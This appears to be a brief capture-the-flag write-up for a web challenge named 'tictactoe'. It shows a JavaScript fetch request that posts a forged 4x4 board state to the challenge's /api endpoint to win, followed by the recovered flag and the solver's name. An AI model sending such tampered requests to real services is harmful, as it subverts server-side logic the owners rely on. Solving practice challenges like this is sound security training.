# web - tictactoe

```
await fetch("/api", {
  method: "POST",
  headers: {"Content-Type":"application/json"},
  body: JSON.stringify({
    mode: "4x4",
    state: [
      [0,0,0,1],
      [0,0,0,1],
      [0,0,0,1],
      [0,0,0,1]
    ]
  })
}).then(r=>r.json()).then(console.log)
```

Flag: `EH4X{D1M3NS1ONAL_GHOST_1N_TH3_SH3LL}`

Solved by: yappare